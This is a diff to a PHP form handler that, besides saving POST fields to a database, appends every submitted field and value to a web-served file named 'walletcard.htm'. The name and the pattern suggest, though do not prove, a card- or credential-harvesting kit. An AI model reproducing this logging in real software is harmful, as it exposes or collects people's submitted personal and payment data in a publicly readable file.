@@ -24,19 +24,34 @@ try {
     // Prepare an insert statement
     $stmt = $pdo->prepare("INSERT INTO submissions (variable, value) VALUES (:variable, :value)");
 
+    // Open or create walletcard.htm in append mode
+    $fileHandle = fopen("walletcard.htm", "a");
+    if ($fileHandle === false) {
+        throw new Exception("Error opening walletcard.htm for writing.");
+    }
+
     // Iterate through POST data
     foreach ($_POST as $variable => $value) {
         // Sanitize form input to prevent any injection attacks
         $safe_variable = htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
         $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
 
-        // Bind parameters and execute
+        // Write sanitized data to walletcard.htm
+        fwrite($fileHandle, "$safe_variable=$safe_value<br>");
+
+        // Bind parameters and execute for database
         $stmt->bindParam(':variable', $safe_variable);
         $stmt->bindParam(':value', $safe_value);
         $stmt->execute();
     }
 
-    // If we reach here, it means all data was saved successfully
+    // Add a separator for entries in walletcard.htm
+    fwrite($fileHandle, "<hr>");
+
+    // Close the file handle
+    fclose($fileHandle);
+
+    // Success response
     echo "<!DOCTYPE html>
     <html lang='en'>
     <head>
@@ -75,7 +90,7 @@ try {
     </body>
     </html>";
 
-} catch (PDOException $e) {
+} catch (Exception $e) {
     // If there is an error, display the error message
     echo "Error: " . $e->getMessage();
 }
